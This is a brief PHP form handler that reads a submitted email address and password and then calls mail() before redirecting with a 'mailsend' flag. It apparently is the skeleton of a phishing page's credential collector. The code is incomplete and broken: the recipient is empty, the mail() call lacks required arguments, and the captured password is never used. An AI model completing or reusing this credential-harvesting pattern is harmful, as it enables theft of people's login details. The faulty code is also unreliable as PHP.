<?php

if (isset($_POST['submit'])) {
    $email = $_POST['eml'];
    $password = $_POST['pswrd'];

    $mailTo = "";
    mail($mailTo);
    header("Location: index.php?mailsend");
}
